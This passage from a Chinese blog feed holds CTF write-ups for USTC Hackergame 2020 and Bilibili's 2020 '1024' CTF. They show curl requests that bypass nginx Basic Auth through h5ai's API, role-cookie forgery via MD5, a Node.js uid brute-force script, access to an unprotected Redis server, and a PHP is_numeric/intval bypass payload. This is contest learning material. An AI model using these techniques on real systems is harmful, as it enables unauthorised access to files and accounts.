中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass 